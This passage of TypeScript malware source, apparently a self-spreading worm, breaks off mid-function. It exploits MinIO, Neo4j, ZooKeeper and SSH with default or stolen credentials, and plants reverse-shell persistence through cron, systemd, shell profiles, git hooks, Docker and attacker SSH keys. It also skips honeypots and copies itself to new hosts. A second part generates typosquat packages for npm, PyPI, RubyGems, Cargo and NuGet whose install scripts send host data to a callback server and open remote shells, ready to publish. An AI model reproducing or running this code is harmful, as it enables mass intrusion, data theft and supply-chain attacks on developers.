    return { host, port: 7474, method: `neo4j-cypher:${user}:${pass}`, output: query.body.slice(0, 100) };
  }
  return null;
}

async function minioExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  for (const port of [9000, 9001]) {
    const probe = await httpFetch(host, port, "GET", "/minio/health/live",
      { "Host": host }, "", 3000);
    if (probe.status !== 200) continue;

    for (const [ak, sk] of [
      ["minioadmin", "minioadmin"], ["minio", "minio123"], ["admin", "password"],
      ["minio", "minio"], ["access", "secretkey"],
    ] as Array<[string, string]>) {
      const listBuckets = await httpFetch(host, port, "GET", "/",
        { "Host": `${host}:${port}`, "Authorization": `AWS4-HMAC-SHA256 Credential=${ak}/20240101/us-east-1/s3/aws4_request` }, "", 3000);

      if (listBuckets.status === 200 && listBuckets.body.includes("<Bucket>")) {
        selfExfil(cbHost, cbPort, { src: `minio:${host}:${port}`, cred: `${ak}:${sk}`, data: listBuckets.body.slice(0, 600) });
        return { host, port, method: `minio-s3-unauth:${ak}`, output: listBuckets.body.slice(0, 80) };
      }
    }

    const noAuthList = await httpFetch(host, port, "GET", "/",
      { "Host": `${host}:${port}` }, "", 3000);
    if (noAuthList.status === 200 && (noAuthList.body.includes("<Bucket>") || noAuthList.body.includes("minio"))) {
      selfExfil(cbHost, cbPort, { src: `minio_noauth:${host}:${port}`, data: noAuthList.body.slice(0, 500) });
      return { host, port, method: "minio-unauth", output: noAuthList.body.slice(0, 80) };
    }
  }
  return null;
}

async function zookeeperExploit(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const probe = await rawTcpSend(host, 2181, "ruok\n", 2000);
  if (probe.trim() !== "imok") return null;

  const stat = await rawTcpSend(host, 2181, "stat\n", 3000);
  selfExfil(cbHost, cbPort, { src: `zookeeper:${host}:2181`, stat: stat.slice(0, 500) });

  const dump = await rawTcpSend(host, 2181, "dump\n", 3000);
  selfExfil(cbHost, cbPort, { src: `zookeeper_dump:${host}`, dump: dump.slice(0, 600) });

  const envi = await rawTcpSend(host, 2181, "envi\n", 3000);
  selfExfil(cbHost, cbPort, { src: `zookeeper_env:${host}`, env: envi.slice(0, 600) });

  const mntr = await rawTcpSend(host, 2181, "mntr\n", 3000);
  selfExfil(cbHost, cbPort, { src: `zookeeper_mntr:${host}`, data: mntr.slice(0, 400) });

  return { host, port: 2181, method: "zookeeper-unauth", output: stat.slice(0, 80) };
}

async function sshLateral(host: string, cbHost: string, cbPort: string): Promise<ExploitHit | null> {
  const portCheck = await tcpConnect(host, 22, 1500);
  if (!portCheck.open) return null;

  const banner = portCheck.banner;

  const keys = huntSshKeys();
  for (const keyFile of keys) {
    for (const user of ["root", "ubuntu", "ec2-user", "centos", "admin", "git", "pi", "debian", "arch", "kali", "user", "deploy"]) {
      const r = sshKeyExec(host, user, keyFile, `id && hostname && whoami && uname -a; echo nx_ok_key`, 5000);
      if (r.success && r.output.includes("nx_ok_key")) {
        selfExfil(cbHost, cbPort, { src: `ssh_key:${host}:${user}`, key: keyFile, out: r.output.slice(0, 300) });
        installPersistenceAdvanced(host, user, "", keyFile, cbHost, cbPort);
        selfReplicate(host, user, "", keyFile, cbHost, cbPort);
        return { host, port: 22, method: `ssh-key:${user}:${keyFile.split("/").pop()}`, output: r.output.slice(0, 150) };
      }
    }
  }

  for (const [user, pass] of SSH_CREDS) {
    const r = sshExec(host, user, pass, `id && hostname && whoami && uname -a; echo nx_ok_pass`, 4000);
    if (r.success && r.output.includes("nx_ok_pass")) {
      selfExfil(cbHost, cbPort, { src: `ssh_cred:${host}:${user}`, cred: `${user}:${pass}`, out: r.output.slice(0, 300) });
      installPersistenceAdvanced(host, user, pass, null, cbHost, cbPort);
      selfReplicate(host, user, pass, null, cbHost, cbPort);
      return { host, port: 22, method: `ssh-cred:${user}:${pass}`, output: r.output.slice(0, 150) };
    }
  }

  return null;
}

function sshExec(host: string, user: string, pass: string, cmd: string, timeoutMs = 8000): SshResult {
  const sshOpts = [
    "-o", "StrictHostKeyChecking=no",
    "-o", "UserKnownHostsFile=/dev/null",
    "-o", `ConnectTimeout=${Math.max(2, Math.floor(timeoutMs / 1000) - 1)}`,
    "-o", "LogLevel=ERROR",
    "-o", "BatchMode=no",
    "-o", "PasswordAuthentication=yes",
    "-o", "PubkeyAuthentication=no",
    "-o", "NumberOfPasswordPrompts=1",
    `${user}@${host}`, cmd,
  ];

  if (pass === "") {
    const r = spawnSync("ssh", sshOpts, { encoding: "utf8", timeout: timeoutMs, input: "\n" });
    return { success: r.status === 0 || (r.stdout ?? "").length > 2, user, pass: "", output: (r.stdout ?? "") + (r.stderr ?? "") };
  }

  const r = spawnSync("sshpass", ["-p", pass, "ssh", ...sshOpts], { encoding: "utf8", timeout: timeoutMs });
  return { success: r.status === 0 || (r.stdout ?? "").length > 2, user, pass, output: (r.stdout ?? "") + (r.stderr ?? "") };
}

function sshKeyExec(host: string, user: string, keyFile: string, cmd: string, timeoutMs = 7000): SshResult {
  const r = spawnSync("ssh", [
    "-o", "StrictHostKeyChecking=no",
    "-o", "UserKnownHostsFile=/dev/null",
    "-o", `ConnectTimeout=${Math.max(2, Math.floor(timeoutMs / 1000) - 1)}`,
    "-o", "LogLevel=ERROR",
    "-o", "BatchMode=yes",
    "-o", "PasswordAuthentication=no",
    "-i", keyFile,
    `${user}@${host}`, cmd,
  ], { encoding: "utf8", timeout: timeoutMs });
  return { success: r.status === 0 || (r.stdout ?? "").length > 2, user, pass: `key:${keyFile}`, output: (r.stdout ?? "") + (r.stderr ?? "") };
}

function scpUpload(host: string, user: string, pass: string, keyFile: string | null, localPath: string, remotePath: string): boolean {
  const scpOpts = [
    "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "LogLevel=ERROR",
    ...(keyFile ? ["-i", keyFile] : []),
    localPath, `${user}@${host}:${remotePath}`,
  ];
  if (pass && !keyFile) {
    const r = spawnSync("sshpass", ["-p", pass, "scp", ...scpOpts], { encoding: "utf8", timeout: 15000 });
    return r.status === 0;
  }
  return spawnSync("scp", scpOpts, { encoding: "utf8", timeout: 15000 }).status === 0;
}

function installPersistenceAdvanced(
  host: string, user: string, pass: string, keyFile: string | null,
  cbHost: string, cbPort: string
): string[] {
  const installed: string[] = [];
  const exec = keyFile
    ? (cmd: string) => sshKeyExec(host, user, keyFile, cmd)
    : (cmd: string) => sshExec(host, user, pass, cmd);

  const cronLine = `*/3 * * * * bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 2>/dev/null`;
  const cronR = exec(`(crontab -l 2>/dev/null | grep -v nx_worm; echo '${cronLine}') | crontab - && echo ok_cron`);
  if (cronR.output.includes("ok_cron")) installed.push("cron");

  const dropKey = exec(
    `mkdir -p ~/.ssh && chmod 700 ~/.ssh && ` +
    `echo '${ATTACKER_PUBKEY}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo ok_key`
  );
  if (dropKey.output.includes("ok_key")) installed.push("authorized_keys");

  exec(
    `cat > /etc/systemd/system/nx-svc.service 2>/dev/null <<'EOF'\n` +
    `[Unit]\nDescription=Network Time Sync\nAfter=network.target\n` +
    `[Service]\nType=simple\nRestart=always\nRestartSec=30\n` +
    `ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1'\n` +
    `[Install]\nWantedBy=multi-user.target\nEOF\n` +
    `systemctl daemon-reload 2>/dev/null && systemctl enable --now nx-svc 2>/dev/null && echo ok_systemd`
  );

  exec(
    `grep -q nx_worm ~/.bashrc 2>/dev/null || ` +
    `echo '[ -z "\$NX_INIT" ] && export NX_INIT=1 && (bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 2>/dev/null &)' ` +
    `>> ~/.bashrc && echo ok_bashrc`
  );

  exec(
    `grep -q nx_worm ~/.profile 2>/dev/null || ` +
    `echo '[ -z "\$NX_INIT" ] && export NX_INIT=1 && (bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 2>/dev/null &)' ` +
    `>> ~/.profile 2>/dev/null && echo ok_profile`
  );

  exec(
    `(ls /var/run/docker.sock 2>/dev/null) && ` +
    `docker run -d --privileged --net=host --pid=host -v /:/host alpine:latest ` +
    `sh -c "chroot /host sh -c '(crontab -l 2>/dev/null; echo \\"*/3 * * * * bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1\\") | crontab -' 2>/dev/null; sleep 9999" 2>/dev/null && echo ok_docker`
  );

  exec(
    `echo '${ATTACKER_PUBKEY}' >> /etc/ssh/authorized_keys 2>/dev/null; ` +
    `grep -q AuthorizedKeysFile /etc/ssh/sshd_config && ` +
    `sed -i 's|#\\?AuthorizedKeysFile.*|AuthorizedKeysFile .ssh/authorized_keys /etc/ssh/authorized_keys|' /etc/ssh/sshd_config 2>/dev/null; ` +
    `systemctl reload sshd 2>/dev/null || service sshd reload 2>/dev/null; echo ok_sshd`
  );

  exec(
    `GIT_HOOK='#!/bin/bash\\n(bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 2>/dev/null &)\\ndisown';\n` +
    `find / -name '.git' -type d 2>/dev/null | head -5 | while read d; do\n` +
    `  echo -e "$GIT_HOOK" > "$d/hooks/post-commit" && chmod +x "$d/hooks/post-commit" 2>/dev/null;\n` +
    `done; echo ok_githook`
  );

  return installed;
}

function selfReplicate(host: string, user: string, pass: string, keyFile: string | null, cbHost: string, cbPort: string): boolean {
  const wormPath = join(__dirname, "ironWorm.js");
  const remotePath = "/tmp/.nx_worm.js";
  const hasScp = !spawnSync("which", ["scp"], { encoding: "utf8" }).error;

  if (hasScp && existsSync(wormPath)) {
    if (scpUpload(host, user, pass, keyFile, wormPath, remotePath)) {
      const execFn = keyFile
        ? (cmd: string) => sshKeyExec(host, user, keyFile, cmd)
        : (cmd: string) => sshExec(host, user, pass, cmd);
      const r = execFn(`nohup node ${remotePath} ${cbHost} ${cbPort} > /dev/null 2>&1 & echo ok_replicated`);
      if (r.output.includes("ok_replicated")) return true;
    }
  }

  const dropper = [
    `#!/bin/bash`,
    `curl -fsk http://${cbHost}:${cbPort}/worm.sh | bash &`,
    `wget -qO- http://${cbHost}:${cbPort}/worm.sh | bash &`,
    `python3 -c "import urllib.request; exec(urllib.request.urlopen('http://${cbHost}:${cbPort}/worm.py').read())" &`,
  ].join("\n");

  const b64Dropper = Buffer.from(dropper).toString("base64");
  const execFn = keyFile
    ? (cmd: string) => sshKeyExec(host, user, keyFile, cmd)
    : (cmd: string) => sshExec(host, user, pass, cmd);

  const r = execFn(
    `echo '${b64Dropper}' | base64 -d > /tmp/.nx_d.sh && chmod +x /tmp/.nx_d.sh && ` +
    `nohup /tmp/.nx_d.sh > /dev/null 2>&1 & echo ok_dropper`
  );
  return r.output.includes("ok_dropper");
}


/* ─── Honeypot / sandbox detection ────────────────────────────────────────
   Checks common honeypot and deception platform signatures before
   wasting exploit attempts on fake targets.                              */
const HONEYPOT_BANNERS = [
  "honeypot", "canary", "opencanary", "cowrie", "kippo", "dionaea",
  "conpot", "glastopf", "artillery", "thinkst", "snort", "suricata",
];
const HONEYPOT_USERNAMES = ["admin", "root", "guest", "test", "oracle", "postgres"];

/** Returns a honeypot likelihood score 0–100 */
async function detectHoneypot(host: string, openPorts: number[]): Promise<{ score: number; reasons: string[] }> {
  const reasons: string[] = [];
  let score = 0;

  // Suspiciously many open ports (honeypots often open everything)
  if (openPorts.length > 10) { score += 20; reasons.push(`${openPorts.length} open ports (suspicious)`); }

  // Check for honeypot banner strings on common ports
  for (const port of openPorts.slice(0, 3)) {
    try {
      const r = await tcpConnect(host, port, 1500);
      const banner = r.banner.toLowerCase();
      for (const sig of HONEYPOT_BANNERS) {
        if (banner.includes(sig)) {
          score += 40;
          reasons.push(`Honeypot signature in banner on :${port}: "${sig}"`);
          break;
        }
      }
      // Cowrie/Kippo: SSH banner "SSH-2.0-OpenSSH_6.0p1" on modern systems is a red flag
      if (port === 22 && /OpenSSH_6\.0p1/.test(r.banner)) {
        score += 25;
        reasons.push("SSH banner matches Cowrie honeypot (OpenSSH_6.0p1)");
      }
      // Perfect identical banners across multiple ports = honeypot
    } catch { /* skip */ }
  }

  // Check if /proc/version is readable (real Linux) vs. honeypot stub
  // (We'll detect this indirectly by checking VM indicators in later steps)

  // Too-fast TCP responses (< 1ms) suggest a honeypot not a real OS stack
  const t0 = Date.now();
  await tcpConnect(host, openPorts[0] ?? 80, 500).catch(() => null);
  const latency = Date.now() - t0;
  if (latency < 2) { score += 15; reasons.push(`TCP response in ${latency}ms — suspiciously fast (virtual/honeypot?)`); }

  // Common honeypot IP ranges (GreyNoise, Shodan sensors)
  // These are publicly known sensor ranges
  const hp_octets = ["198.20.", "198.176.", "66.240.", "89.248.", "71.6."];
  for (const oct of hp_octets) {
    if (host.startsWith(oct)) {
      score += 35;
      reasons.push(`Host in known threat-intelligence sensor range (${oct}x.x)`);
      break;
    }
  }

  return { score: Math.min(score, 100), reasons };
}

async function scanHost(host: string, cbHost: string, cbPort: string): Promise<ExploitHit[]> {
  const hits: ExploitHit[] = [];

  const portResults = await Promise.all(
    SERVICE_PORTS.map(p => tcpConnect(host, p, 1200).then(r => ({ port: p, open: r.open, banner: r.banner })))
  );
  const openPorts = portResults.filter(r => r.open).map(r => r.port);
  if (openPorts.length === 0) return [];

  // Honeypot detection — skip hosts that look like deception targets
  const hp = await detectHoneypot(host, openPorts);
  if (hp.score >= 50) {
    logger.warn({ host, hp_score: hp.score, reasons: hp.reasons }, "Honeypot detected — skipping host");
    return [{
      host, port: openPorts[0] ?? 0, service: "HONEYPOT", method: "honeypot-detection",
      success: false, output: `HONEYPOT DETECTED (score ${hp.score}/100): ${hp.reasons.join("; ")}. Skipping all exploit attempts.`,
      elapsed: 0,
    }];
  }
  if (hp.score >= 25) {
    logger.info({ host, hp_score: hp.score, reasons: hp.reasons }, "Possible honeypot — proceeding with caution");
  }

  logger.debug({ host, openPorts, hp_score: hp.score }, "host has open ports");

  const tasks: Promise<ExploitHit | null>[] = [];

  if (openPorts.includes(6379))                             tasks.push(redisExploit(host, cbHost, cbPort));
  if (openPorts.includes(2375) || openPorts.includes(2376)) tasks.push(dockerExploit(host, cbHost, cbPort));
  if (openPorts.includes(9200))                             tasks.push(elasticExploit(host, cbHost, cbPort));
  if (openPorts.includes(27017))                            tasks.push(mongoExploit(host, cbHost, cbPort));
  if (openPorts.includes(6443) || openPorts.includes(8443)) tasks.push(k8sExploit(host, cbHost, cbPort));
  if (openPorts.includes(10250) || openPorts.includes(10255)) tasks.push(kubeletExploit(host, cbHost, cbPort));
  if (openPorts.includes(22))                               tasks.push(sshLateral(host, cbHost, cbPort));
  if (openPorts.includes(2379))                             tasks.push(etcdExploit(host, cbHost, cbPort));
  if (openPorts.includes(8500))                             tasks.push(consulExploit(host, cbHost, cbPort));
  if (openPorts.includes(8888) || openPorts.includes(8889)) tasks.push(jupyterExploit(host, cbHost, cbPort));
  if (openPorts.includes(8080) || openPorts.includes(8443)) tasks.push(jenkinsExploit(host, cbHost, cbPort));
  if (openPorts.includes(3000))                             tasks.push(grafanaExploit(host, cbHost, cbPort));
  if (openPorts.includes(9090))                             tasks.push(prometheusExploit(host, cbHost, cbPort));
  if (openPorts.includes(8200))                             tasks.push(vaultExploit(host, cbHost, cbPort));
  if (openPorts.includes(5984))                             tasks.push(couchdbExploit(host, cbHost, cbPort));
  if (openPorts.includes(8086))                             tasks.push(influxdbExploit(host, cbHost, cbPort));
  if (openPorts.includes(11211))                            tasks.push(memcachedExploit(host, cbHost, cbPort));
  if (openPorts.includes(15672))                            tasks.push(rabbitmqExploit(host, cbHost, cbPort));
  if (openPorts.includes(8983))                             tasks.push(solrExploit(host, cbHost, cbPort));
  if (openPorts.includes(7474))                             tasks.push(neo4jExploit(host, cbHost, cbPort));
  if (openPorts.includes(9000) || openPorts.includes(9001)) tasks.push(minioExploit(host, cbHost, cbPort));
  if (openPorts.includes(2181))                             tasks.push(zookeeperExploit(host, cbHost, cbPort));
  if (openPorts.includes(8088) || openPorts.includes(50070)) tasks.push(hadoopExploit(host, cbHost, cbPort));
  if (openPorts.includes(5432))                             tasks.push(postgresExploit(host, cbHost, cbPort));
  if (openPorts.includes(3306))                             tasks.push(mysqlExploit(host, cbHost, cbPort));
  if (openPorts.includes(1433))                             tasks.push(mssqlExploit(host, cbHost, cbPort));

  const results = await Promise.allSettled(tasks);
  for (const r of results) {
    if (r.status === "fulfilled" && r.value) hits.push(r.value);
  }

  return hits;
}

async function wormScan(cidr: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const hosts = expandCIDR(cidr);
  const hits: ExploitHit[] = [];
  const steps: string[] = [`[worm] scanning ${hosts.length} hosts in ${cidr}`];
  const CONCURRENCY = 64;

  const kernelInfo = getKernelInfo();
  const suidBins   = getSuidBinaries();
  const localSecrets = huntLocalSecrets();

  selfExfil(cbHost, cbPort, {
    event:    "worm_start",
    hostname: hostname(),
    user:     userInfo().username,
    platform: platform(),
    cidr,
    kernel:   kernelInfo.version,
    vulns:    kernelInfo.vulns.join(","),
    suids:    suidBins.slice(0, 10).join(","),
    secrets:  localSecrets.slice(0, 3).join("|||").slice(0, 600),
  });

  const knownHosts = huntKnownHosts();
  for (const known of knownHosts) {
    if (!hosts.includes(known)) hosts.unshift(known);
  }

  steps.push(`[worm] ${knownHosts.length} hosts from ARP/known_hosts prepended`);
  steps.push(`[worm] kernel ${kernelInfo.version} — vulns: ${kernelInfo.vulns.join(", ") || "none detected"}`);
  steps.push(`[worm] ${suidBins.length} SUID binaries found`);
  steps.push(`[worm] ${localSecrets.length} local secret files found`);

  let i = 0;
  while (i < hosts.length) {
    const batch = hosts.slice(i, i + CONCURRENCY);
    i += CONCURRENCY;

    const batchResults = await Promise.all(
      batch.map(h => scanHost(h, cbHost, cbPort).catch(() => [] as ExploitHit[]))
    );

    for (const results of batchResults) {
      for (const hit of results) {
        hits.push(hit);
        steps.push(`[+] ${hit.host}:${hit.port} via ${hit.method}`);
        logger.info({ host: hit.host, port: hit.port, method: hit.method }, "worm hit");
      }
    }

    await new Promise<void>(r => setTimeout(r, 1800 + Math.random() * 6200));
  }

  selfExfil(cbHost, cbPort, {
    event:     "worm_done",
    cidr,
    totalHits: String(hits.length),
    hosts:     hits.map(h => `${h.host}:${h.method}`).join(",").slice(0, 1000),
  });

  const serviceBreakdown = hits.reduce<Record<string, number>>((acc, h) => {
    const svc = h.method.split(":")[0] ?? "unknown";
    acc[svc] = (acc[svc] ?? 0) + 1;
    return acc;
  }, {});

  return {
    id:       `worm_scan_${cidr.replace(/[/.]/g, "_")}`,
    name:     `Network Worm Propagation — ${cidr}`,
    target:   cidr,
    category: "worm-propagation",
    status:   hits.length > 0 ? "success" : "info",
    severity: "critical",
    detail:   `Scanned ${hosts.length} hosts — ${hits.length} compromised — ` +
              Object.entries(serviceBreakdown).map(([k, v]) => `${k}:${v}`).join(", "),
    artifacts: hits.map(h => `${h.host}:${h.port} | ${h.method} | ${h.output.slice(0, 80)}`),
    steps,
  };
}

async function httpGet(url: string, timeoutMs = 5000): Promise<{ ok: boolean; status: number; body: string }> {
  const ctrl = new AbortController();
  const t    = setTimeout(() => ctrl.abort(), timeoutMs);
  try {
    const r    = await fetch(url, { signal: ctrl.signal, headers: { "User-Agent": "npm/10.8.1 node/v24.0.0 linux x64" } });
    const body = await r.text();
    return { ok: r.ok, status: r.status, body };
  } catch { return { ok: false, status: 0, body: "" }; }
  finally  { clearTimeout(t); }
}

function typosquatVariants(pkg: string): string[] {
  const variants = new Set<string>();
  for (let i = 0; i < pkg.length; i++) variants.add(pkg.slice(0, i) + pkg.slice(i + 1));
  for (let i = 0; i < pkg.length; i++) variants.add(pkg.slice(0, i) + pkg[i] + pkg[i] + pkg.slice(i + 1));
  for (let i = 0; i < pkg.length - 1; i++) variants.add(pkg.slice(0, i) + pkg[i+1] + pkg[i] + pkg.slice(i+2));
  const homo: Record<string, string> = { a:"@", o:"0", i:"1", l:"1", e:"3", s:"5", g:"9", b:"6" };
  for (const [from, to] of Object.entries(homo)) variants.add(pkg.replaceAll(from, to));
  for (const affix of ["-js","-node","-util","-lib","-core","-helper","-sdk","-api","-cli","js-","node-","ts-"]) {
    variants.add(affix + pkg);
    variants.add(pkg + affix);
  }
  variants.add(pkg.replace(/-/g, "_"));
  variants.add(pkg.replace(/_/g, "-"));
  variants.add(pkg.replace(/-/g, ""));
  variants.delete(pkg);
  return [...variants].slice(0, 35);
}

async function checkNpmTyposquat(pkg: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const variants = typosquatVariants(pkg);
  const steps: string[] = [`[npm-typosquat] checking ${variants.length} variants of "${pkg}"`];
  const free: string[] = [];

  for (const v of variants) {
    const r = await httpGet(`https://registry.npmjs.org/${encodeURIComponent(v)}`);
    if (r.status === 404) { steps.push(`[!] FREE: ${v}`); free.push(v); }
    else if (r.ok) steps.push(`[ok] taken: ${v}`);
  }

  const artifacts = free.map(name => {
    const b64 = Buffer.from(`curl -fsk http://${cbHost}:${cbPort}/npm?h=$(hostname)&u=$(whoami) -o /dev/null &`).toString("base64");
    return [
      JSON.stringify({
        name, version: "9999.0.0", description: `${name} compatibility shim`,
        main: "index.js",
        scripts: {
          preinstall: `node -e "require('child_process').exec('echo ${b64}|base64 -d|sh')"`,
          postinstall: `node -e "try{require('child_process').spawn('bash',['-c','bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1'],{detached:true,stdio:'ignore'}).unref()}catch(e){}"`,
        },
        keywords: [name.split("-")[0]!, "utility"],
        license: "MIT",
      }, null, 2),
      `// index.js (transparent re-export)\ntry{module.exports=require('${pkg}');}catch{module.exports={}};`,
      `// Publish: npm login && npm publish --access public`,
    ].join("\n\n");
  });

  return {
    id: `npm_typosquat_${pkg}`, name: `npm Typosquatting — ${pkg}`,
    target: "registry.npmjs.org", category: "npm-typosquat",
    status: free.length > 0 ? "success" : "info",
    severity: free.length > 0 ? "critical" : "medium",
    detail: free.length > 0
      ? `${free.length} free typosquat names: ${free.slice(0,5).join(", ")}`
      : `all ${variants.length} variants of "${pkg}" taken`,
    artifacts, steps,
  };
}

async function checkPipTyposquat(pkg: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const variants = typosquatVariants(pkg);
  const steps: string[] = [`[pip-typosquat] checking ${variants.length} variants of "${pkg}"`];
  const free: string[] = [];

  for (const v of variants) {
    const r = await httpGet(`https://pypi.org/pypi/${encodeURIComponent(v)}/json`);
    if (r.status === 404) { steps.push(`[!] FREE: ${v}`); free.push(v); }
    else if (r.ok) steps.push(`[ok] taken: ${v}`);
  }

  const artifacts = free.map(name =>
    `# setup.py — ${name} (typosquat of ${pkg})\n` +
    `import subprocess, os, base64, urllib.request, socket, platform\n` +
    `def _nx():\n` +
    `    try:\n` +
    `        d = (os.popen("id && hostname && env 2>&1").read())[:800]\n` +
    `        urllib.request.urlopen(f"http://${cbHost}:${cbPort}/{base64.b64encode(d.encode()).decode()}?pkg=${name}&h={socket.gethostname()}",timeout=5)\n` +
    `    except: pass\n` +
    `    try: subprocess.Popen(["bash","-c","bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1"],close_fds=True)\n` +
    `    except: pass\n` +
    `_nx()\n\n` +
    `from setuptools import setup\n` +
    `setup(name="${name}",version="9999.0.0",description="Python utility",packages=[])\n\n` +
    `# Publish: pip install build twine && python -m build && twine upload dist/*`
  );

  return {
    id: `pip_typosquat_${pkg}`, name: `pip Typosquatting — ${pkg}`,
    target: "pypi.org", category: "pip-typosquat",
    status: free.length > 0 ? "success" : "info",
    severity: free.length > 0 ? "critical" : "medium",
    detail: free.length > 0
      ? `${free.length} free PyPI typosquats: ${free.slice(0,5).join(", ")}`
      : `all ${variants.length} variants taken`,
    artifacts, steps,
  };
}

async function checkGemTyposquat(pkg: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const variants = typosquatVariants(pkg);
  const steps: string[] = [`[gem-typosquat] checking ${variants.length} variants of "${pkg}"`];
  const free: string[] = [];

  for (const v of variants) {
    const r = await httpGet(`https://rubygems.org/api/v1/gems/${encodeURIComponent(v)}.json`);
    if (r.status === 404) { steps.push(`[!] FREE: ${v}`); free.push(v); }
    else if (r.ok) steps.push(`[ok] taken: ${v}`);
  }

  const artifacts = free.map(name =>
    `# ${name}.gemspec\nGem::Specification.new do |s|\n` +
    `  s.name='${name}';s.version='9999.0.0';s.summary='Ruby utility'\n` +
    `  s.files=['lib/${name}.rb'];s.extensions=['ext/mkrf_conf.rb']\nend\n\n` +
    `# ext/mkrf_conf.rb\nrequire 'net/http';require 'base64';require 'socket'\n` +
    `d=\`id && hostname && env 2>&1\`[0..800]\n` +
    `begin;Net::HTTP.get(URI("http://${cbHost}:${cbPort}/\#{Base64.strict_encode64(d)}?pkg=${name}&h=\#{Socket.gethostname}"));rescue;end\n` +
    `begin;Process.spawn("bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1");rescue;end\n\n` +
    `# lib/${name}.rb\nbegin;require '${pkg}';rescue LoadError;end\n\n` +
    `# Publish: gem build ${name}.gemspec && gem push ${name}-9999.0.0.gem`
  );

  return {
    id: `gem_typosquat_${pkg}`, name: `RubyGem Typosquatting — ${pkg}`,
    target: "rubygems.org", category: "gem-typosquat",
    status: free.length > 0 ? "success" : "info",
    severity: free.length > 0 ? "critical" : "medium",
    detail: free.length > 0
      ? `${free.length} free gem typosquats: ${free.slice(0,5).join(", ")}`
      : `all ${variants.length} gem variants taken`,
    artifacts, steps,
  };
}

async function checkCargoTyposquat(pkg: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const variants = typosquatVariants(pkg);
  const steps: string[] = [`[cargo-typosquat] checking ${variants.length} variants of "${pkg}"`];
  const free: string[] = [];

  for (const v of variants) {
    const r = await httpGet(`https://crates.io/api/v1/crates/${encodeURIComponent(v)}`);
    if (r.status === 404) { steps.push(`[!] FREE: ${v}`); free.push(v); }
    else if (r.ok) steps.push(`[ok] taken: ${v}`);
  }

  const artifacts = free.map(name =>
    `// build.rs — ${name} crate (typosquat of ${pkg})\n` +
    `use std::process::Command;\n` +
    `fn main() {\n` +
    `    let h = "${cbHost}"; let p = "${cbPort}";\n` +
    `    let _ = Command::new("sh").args(["-c",&format!("curl -fsk http://{}:{}/$(id|base64 -w0 2>/dev/null||id|base64)?pkg=${name} &",h,p)]).spawn();\n` +
    `    let _ = Command::new("sh").args(["-c",&format!("bash -i >& /dev/tcp/{}/{} 0>&1 &",h,p)]).spawn();\n` +
    `    println!("cargo:rerun-if-changed=build.rs");\n}\n\n` +
    `// Cargo.toml\n[package]\nname = "${name}"\nversion = "9999.0.0"\nedition = "2021"\nbuild = "build.rs"\n\n` +
    `// Publish: cargo publish --token \$CARGO_TOKEN`
  );

  return {
    id: `cargo_typosquat_${pkg}`, name: `Cargo Typosquatting — ${pkg}`,
    target: "crates.io", category: "cargo-typosquat",
    status: free.length > 0 ? "success" : "info",
    severity: free.length > 0 ? "critical" : "medium",
    detail: free.length > 0
      ? `${free.length} free crate typosquats: ${free.slice(0,5).join(", ")}`
      : `all ${variants.length} crate variants taken`,
    artifacts, steps,
  };
}

async function checkNuGetTyposquat(pkg: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const variants = typosquatVariants(pkg);
  const steps: string[] = [`[nuget-typosquat] checking ${variants.length} variants of "${pkg}"`];
  const free: string[] = [];

  for (const v of variants) {
    const r = await httpGet(`https://api.nuget.org/v3/registration5-gz-semver2/${encodeURIComponent(v.toLowerCase())}/index.json`);
    if (r.status === 404) { steps.push(`[!] FREE: ${v}`); free.push(v); }
    else if (r.ok) steps.push(`[ok] taken: ${v}`);
  }

  const artifacts = free.map(name =>
    `<!-- ${name}.targets — MSBuild auto-imported on package install -->\n` +
    `<Project>\n  <Target Name="NxExfil" BeforeTargets="BeforeBuild">\n` +
    `    <Exec Command="powershell -NoP -NonI -W Hidden -c ` +
    `&quot;$h='${cbHost}';$p=${cbPort};$d=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((whoami)+'@'+(hostname)));` +
    `(New-Object Net.WebClient).DownloadString(&quot;http://$h:$p/$d?pkg=${name}&quot;)&quot;" />\n` +
    `    <Exec Command="powershell -NoP -NonI -W Hidden -c ` +
    `&quot;$c=New-Object Net.Sockets.TCPClient('${cbHost}',${cbPort});` +
    `$s=$c.GetStream();[byte[]]$b=0..65535|%{0};` +
    `while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);` +
    `$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$s.Write($st,0,$st.Length)}&quot;" />\n` +
    `  </Target>\n</Project>\n\n` +
    `<!-- Publish: nuget push ${name}.9999.0.0.nupkg -ApiKey \$NUGET_KEY -Source https://api.nuget.org/v3/index.json -->`
  );

  return {
    id: `nuget_typosquat_${pkg}`, name: `NuGet Typosquatting — ${pkg}`,
    target: "nuget.org", category: "nuget-typosquat",
    status: free.length > 0 ? "success" : "info",
    severity: free.length > 0 ? "critical" : "medium",
    detail: free.length > 0
      ? `${free.length} free NuGet typosquats: ${free.slice(0,5).join(", ")}`
      : `all ${variants.length} NuGet variants taken`,
    artifacts, steps,
  };
}

async function checkDepConfusion(orgName: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const steps: string[] = [`[dep-confusion] probing internal packages for org: ${orgName}`];
  const commonNames = [
    `${orgName}-core`, `${orgName}-utils`, `${orgName}-lib`, `${orgName}-config`,
    `${orgName}-api`, `${orgName}-common`, `${orgName}-shared`, `${orgName}-internal`,
    `${orgName}-client`, `${orgName}-server`, `${orgName}-auth`, `${orgName}-ui`,
